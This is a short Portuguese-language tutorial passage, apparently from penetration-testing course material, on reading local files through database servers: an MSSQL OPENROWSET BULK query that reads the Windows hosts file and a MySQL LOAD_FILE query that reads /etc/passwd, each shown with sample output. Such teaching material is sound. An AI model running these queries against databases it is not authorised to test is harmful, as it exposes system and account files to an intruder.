# Leia arquivos locais

Por padrão, `MSSQL` permite a leitura de arquivos em qualquer arquivo no sistema operacional ao qual a conta tenha acesso de leitura. Podemos usar a seguinte consulta SQL:

## Leia arquivos locais em MSSQL

```shell
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Como mencionamos anteriormente, por padrão uma instalação `MySQL` não permite a leitura arbitrária de arquivos, mas se as configurações corretas estiverem em vigor e com os privilégios apropriados, podemos ler arquivos usando os seguintes métodos:

## MySQL - Leia arquivos locais no MySQL

```shell
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

